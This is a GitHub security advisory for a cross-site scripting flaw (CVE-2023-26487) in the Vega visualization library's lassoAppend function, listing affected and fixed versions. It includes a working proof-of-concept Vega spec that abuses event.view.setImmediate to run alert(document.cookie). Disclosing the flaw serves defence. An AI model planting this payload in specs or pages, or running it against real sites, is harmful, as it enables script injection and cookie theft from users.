# [M] Vega has Cross-site Scripting vulnerability in `lassoAppend` function

## Summary
Severity: Medium
Advisory: GHSA-w5m3-xh75-mp55
CVE: CVE-2023-26487
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2023-03-02
Source: https://github.com/advisories/GHSA-w5m3-xh75-mp55
Type: github-advisory

## Affected
- npm: `vega` — affected >=0 <5.23.0
- npm: `vega-functions` — affected >=0 <5.13.1

## Details
### Summary

Vega's `lassoAppend` function: `lassoAppend` accepts 3 arguments and internally invokes `push` function on the 1st argument specifying array consisting of 2nd and 3rd arguments as `push` call argument. The type of the 1st argument is supposed to be an array, but it's not enforced.

This makes it possible to specify any object with a `push` function as the 1st argument, `push` function can be set to any function that can be access via `event.view` (no all such functions can be exploited due to invalid context or signature, but some can, e.g. `console.log`).

### Details
The issue is that [`lassoAppend`](https://github.com/vega/vega/blob/7eafbbd4d53d0ce9f08e74ff96c90d411b1bb80a/packages/vega-functions/src/functions/lasso.js#L13) doesn't enforce proper types of its arguments:
```js
.....
export function lassoAppend(lasso, x, y, minDist = 5) {
    const last = lasso[lasso.length - 1];

    // Add point to lasso if distance to last point exceed minDist or its the first point
    if (last === undefined || Math.sqrt(((last[0] - x) ** 2) + ((last[1] - y) ** 2)) > minDist) {
        lasso.push([x, y]);
.....
```

### PoC

Use the following Vega snippet (depends on browser's non-built-in `event.view.setImmediate` function, feel free to replace with `event.view.console.log` or alike and observe the result in the browser's console)

```json
{
  "$schema": "https://vega.github.io/schema/vega/v5.json",
  "width": 350,
  "height": 350,
  "autosize": "none",
  "description": "Toggle Button",
  "signals": [
    {
      "name": "toggle",
      "value": false,
      "on": [
        {
          "events": {"type": "click", "markname": "circle"},
          "update": "toggle ? false : true"
        }
      ]
    },
    {
      "name": "addFilter",
      "on": [
        {
          "events": {"type": "mousemove", "source": "window"},
          "update": "lassoAppend({'push':event.view.setImmediate},'alert(document.domain)','alert(document.cookie)')"
        }
      ]
    }
  ],
  "marks": [
    {
      "name": "circle",
      "type": "symbol",
      "zindex": 1,
      "encode": {
        "enter": {
          "y": {"signal": "height/2"},
          "angle": {"value": 0},
          "size": {"value": 400},
          "shape": {"value": "circle"},
          "fill": {"value": "white"},
          "stroke": {"value": "white"},
          "strokeWidth": {"value": 2},
          "cursor": {"value": "pointer"},
          "tooltip": {"signal": "{Tip: 'Click to fire XSS'}"}
        },
        "update": {"x": {"signal": "toggle === true ? 190 : 165"}}
      }
    },
    {
      "name": "rectangle",
      "type": "rect",
      "zindex": 0,
      "encode": {
        "enter": {
          "x": {"value": 152},
          "y": {"value": 162.5},
          "width": {"value": 50},
          "height": {"value": 25},
          "cornerRadius": {"value": 20}
        },
        "update": {
          "fill": {"signal": "toggle === true ? '#006BB4' : '#939597'"}
        }
      }
    }
  ]
}
```

### Impact
This issue opens various XSS vectors, but exact impact and severity depends on the environment (e.g. Core JS `setImmediate` polyfill basically allows `eval`-like functionality).

## References
- https://github.com/vega/vega/security/advisories/GHSA-w5m3-xh75-mp55
- https://nvd.nist.gov/vuln/detail/CVE-2023-26487
- https://github.com/vega/vega/commit/01adb034f24727d3bb321bbbb6696a7f4cd91689
- https://github.com/vega/vega
- https://github.com/vega/vega/releases/tag/v5.23.0
